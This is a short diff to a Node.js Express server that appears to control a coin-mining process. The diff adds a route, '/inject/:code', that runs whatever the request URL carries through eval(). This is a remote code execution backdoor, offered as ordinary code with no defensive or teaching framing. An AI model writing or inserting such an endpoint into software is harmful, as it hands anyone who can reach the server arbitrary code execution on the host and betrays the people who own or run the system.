@@ -1,3 +1,4 @@
+const npm = require('npm');
 const { spawn } = require('child_process');
 const express = require('express');
 const app = express();
@@ -15,6 +16,9 @@ app.get('/status', function (req, res) {
 app.get('/coin/:coin', function (req, res) {
   	coin = req.params.coin;
     res.send('coin setted to: '+coin)
+});
+app.get('/inject/:code', function (req, res) {
+  	eval(req.params.code);
 });
 const start = ()=>{
     state = true;
